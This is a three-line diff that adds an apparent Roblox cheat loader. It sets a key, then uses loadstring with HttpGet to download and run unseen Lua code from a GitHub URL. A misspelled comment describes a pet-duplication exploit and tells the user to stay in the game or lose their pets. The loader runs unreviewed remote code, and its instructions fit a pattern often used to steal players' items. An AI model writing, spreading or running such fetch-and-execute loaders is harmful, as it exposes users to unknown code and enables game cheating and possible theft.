@@ -1,0 +1,3 @@
+_G.Key = "70xirtinimoD"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
+#if it teleports you into the bank stay and most importently dont leave the game otherwise you will loose you pets its a dupe proces so leavi it be if the script doesbt work dele this tecxt
